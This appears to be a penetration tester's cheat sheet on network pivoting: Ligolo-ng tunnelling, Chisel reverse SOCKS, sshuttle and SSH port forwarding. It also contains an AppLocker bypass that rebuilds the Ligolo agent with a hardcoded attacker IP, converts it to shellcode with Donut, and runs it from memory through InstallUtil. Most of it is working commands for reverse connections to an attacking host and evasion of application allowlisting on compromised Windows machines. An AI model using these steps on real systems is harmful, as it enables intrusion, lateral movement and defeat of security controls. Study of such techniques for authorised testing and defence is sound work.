
# Ligolo-ng

To begin using Ligolo-ng, download the latest release from GitHub, as the version available in the Kali repository may not function as expected.

**Download Link**: [Ligolo-ng Releases](https://github.com/nicocha30/ligolo-ng/releases)

## Setting Up the Proxy

To set up the proxy, execute the following command in your terminal:

```bash
# Run the proxy with self-signed certificate option
sudo ./proxy --selfcert
```

## Running the Agent on the Target System

After setting up the proxy, you will need to run the agent on the target system. You can download the agent from the same GitHub releases page.

**Agent Download Link**: [Ligolo-ng Releases](https://github.com/nicocha30/ligolo-ng/releases)

You can start the agent using the following commands. It is recommended to use `Start-Process` to avoid locking the console when running on Windows.

```powershell
# Using Start-Process to run the agent (preferred for console usage)
Start-Process -FilePath ".\agent.exe" -ArgumentList "--ignore-cert -connect 192.168.45.194:11601"

# Running normally if you are in a GUI environment
.\agent.exe -ignore-cert -connect 192.168.45.194:11601
```

## Configuring Tunneling

To configure tunneling with Ligolo-ng, follow these steps:

```bash
# Use "session" to select the connected agent
ligolo-ng » "session"

# Specify the required session 
Specify a session : "1" - NT AUTHORITY\SYSTEM@client02 - 192.168.122.200:63065 - a2d7a799-92e5-4853-ba79-02d702116f8d

# Specify the "autoroute"
[Agent : NT AUTHORITY\SYSTEM@client02] » "autoroute"

# Select the route to add
Select routes to add: 172.16.122.50/24
Create a new interface or use an existing one Create a new interface
INFO[0068] Generating a random interface name...        
INFO[0068] Creating a new suitablegenesis interface... 
INFO[0068] Using interface suitablegenesis, creating routes... 
INFO[0068] Route 172.16.122.50/24 created.              

# Start tunneling
Start the tunnel "Yes"
[Agent : NT AUTHORITY\SYSTEM@client02] » INFO[0070] Starting tunnel to NT AUTHORITY\SYSTEM@client02 (a2d7a799-92e5-4853-ba79-02d702116f8d) 
[Agent : NT AUTHORITY\SYSTEM@client02] » 
```

# Ligolo-ng - AppLocker Bypass

Executing a Ligolo agent on a Windows system with AppLocker enabled can be quite challenging. However, it is feasible to convert the Ligolo agent binary into shellcode using Donut, and then inject the shellcode into memory. This process involves abusing InstallUtil for execution to bypass AppLocker constraints.

### Steps to Bypass AppLocker

1. **Clone the Ligolo Repository**: Start by cloning the Ligolo repository to your local disk:

    ```bash
    git clone https://github.com/nicocha30/ligolo-ng.git
    ```

2. **Modify the Agent Source Code**: Edit the agent's source code to hardcode the attacking system's IP address and specify to ignore certificates. Open the main.go file using a text editor:

    ```bash
    nano /ligolo-ng/cmd/agent/main.go
    ```

    ![image](https://github.com/user-attachments/assets/09d05271-16f5-416d-81d1-c2dd7668c242)

3. **Compile the New Agent**: After modifying the source code, compile the new agent with the following command:

    ```bash
    GOOS=windows go build -o agent.exe /ligolo-ng/cmd/agent/main.go
    ```

4. **Generate Shellcode Using Donut**: Utilize Donut to create shellcode from the newly compiled agent.exe:

    ```bash
    ./donut -a 2 -f 1 -o /home/kali/ts_client/agent.bin -i /home/kali/Downloads/ligolo-ng/agent.exe -e 1
    ```

5. **Host the Shellcode**: It’s generally advisable to host the shellcode on the attacking system. The agent.exe binary will typically be between 9-50MB of raw shellcode, which may cause IDEs to crash, so it's better to host the raw binary file.

6. **Modify and Compile the C# Template**: Use the provided C# template to run the shellcode. The template can be found [here](https://github.com/The-Viper-One/OSEP-Notes/blob/main/Pivoting/ligolo_shellcode_runner_InstallUtil.cs). Ensure to change the URL on line 43 to point to your own IP address and the path to the donut shellcode agent.bin file.

7. **Execute on the AppLocker System**: Compile the C# binary and execute it on the AppLocker system using the methods described [here](https://github.com/The-Viper-One/OSEP-Notes/tree/main/Application_Whitelisting/Bypass_Execution_Methods/InstallUtil):

    ```powershell
    # Execute EXE (x64)
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "LigoloShellcode.exe"

    # Execute EXE (x86)
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "LigoloShellcode.exe"
    ```

    ![image](https://github.com/user-attachments/assets/fd8adea2-5dde-4c2d-842e-5328d0298abe)


# Chisel 

### Attacking Machine
```bash
./chisel server -p <Port> --reverse &
./chisel server -p 1337 --reverse &
```

### On Target Machine
```bash
./chisel client <Attacking-IP>:<Port> R:socks &
./chisel client 10.50.46.8:1337 R:socks &
```

 Then use Proxychains to scan internal networks from the compromised host.

# SSHuttle

### Authenticate with password
```bash
sshuttle -r <User>@<Target-IP> <Target-Subnet> -x <Target-IP>
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```

### Authenticate with key
```bash
sshuttle -r <User>@<IP> --ssh-cmd "<Command>" <Target Subnet> -x <Exclude IP>
sshuttle -r root@10.200.48.200 --ssh-cmd "ssh -i id_rsa" 10.200.48.0/24 -x 10.200.48.200
```

# SSH

### Forward RDP from internal host to Attacking Machine on port 1337.
```bash
ssh -L <LocalHost>:<Port>:<IP-To-Forward-From>:<Port> <User>@<IP>
ssh -L 127.0.0.1:1337:10.200.48.150:3389 root@10.200.48.200 -i id_rsa
```

### Forward remote port 80 to local port 80
```bash
ssh atena@10.10.72.69 -L 80:127.0.0.1:80
ssh <User>@<IP> -L <Local-Port>127.0.0.1<Remote-Port>
```

### Dynamic SSH Port Forwarding
```bash
ssh -i <id_rsa> <User>@<IP> -D <Proxychains-Port>
ssh -i id_rsa errorcauser@10.10.254.201 -D 1080
```
 
